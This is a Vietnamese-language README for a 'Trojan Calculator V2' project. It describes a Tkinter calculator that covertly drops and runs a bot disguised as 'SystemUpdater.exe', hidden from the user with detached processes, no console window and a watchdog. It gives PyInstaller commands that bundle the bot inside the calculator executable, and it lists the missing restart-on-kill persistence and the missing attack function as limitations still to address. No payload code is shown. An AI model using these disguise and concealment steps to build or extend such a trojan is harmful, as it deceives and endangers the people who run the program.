# Trojan Calculator - Phiên Bản 2 (V2)

## Tổng Quan

Phiên bản 2 của dự án Trojan Calculator thử nghiệm việc ẩn các cửa sổ console và chuyển sang đọc thông tin từ file log. Trojan vẫn ngụy trang dưới dạng máy tính cầm tay (GUI Tkinter) và sử dụng icon tùy chỉnh cho cả calculator và bot.

## Tính Năng

- **Giao Diện Máy Tính Cầm Tay**: Giao diện tính toán cơ bản (cộng, trừ, nhân, chia) với icon tùy chỉnh.
- **Bot Ngầm**:
  - `SystemUpdater.exe` chạy ngầm mà không hiển thị console.
  - Sử dụng `subprocess.DETACHED_PROCESS` trong `watchdog()` để chạy độc lập.
- **Ghi Nhật Ký**:
  - `%APPDATA%\trojan.log`: Ghi hoạt động của trojan.
  - `%APPDATA%\system_log.txt`: Ghi trạng thái bot để theo dõi.

## Cấu Trúc

- `calculator_trojan_V2.py`: Script chính khởi chạy giao diện và triển khai bot.
- `bot_test_V2.py`: Script bot chạy ngầm và ghi log.

## Cách Xây Dựng và Chạy

### Đóng Gói `bot_test_V2.py`

```bash
pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil bot_test_V2.py
copy C:\TrojanFiles\dist\bot_test_V2.exe SystemUpdater.exe
move SystemUpdater.exe C:\TrojanFiles\
```

## Đóng Gói `calculator_trojan_V2.py`

Đảm bảo `SystemUpdater.exe` đã có trong thư mục `C:\TrojanFiles`.

```bash
pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdater.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V2.py
```

## Điều Chỉnh

- Trong `calculator_trojan_V2.py`, hàm `drop_bot()` sử dụng `subprocess.DETACHED_PROCESS` để bot chạy ngầm mà không mở terminal.
- Trong `bot_test_V2.py`, hàm `watchdog()` sử dụng `subprocess.DETACHED_PROCESS` cùng với tham số `--noconsole` để đảm bảo bot và watchdog chạy ẩn.

## Chạy

- Chạy `calculator_trojan_V2.exe` để mở giao diện tính toán.
- Bot (`SystemUpdater.exe`) và watchdog sẽ chạy ngầm.
- Kiểm tra `%APPDATA%\system_log.txt` để theo dõi hoạt động của bot.

## Hạn Chế

- Chưa có cơ chế watchdog tách biệt hoặc tự khởi động lại khi bị kill.
- Bot vẫn chỉ ghi log, chưa có chức năng tấn công.

## Lưu Ý

- Đảm bảo file icon `SystemUpdater.ico` và `calculator.ico` có trong thư mục `C:\TrojanFiles`.
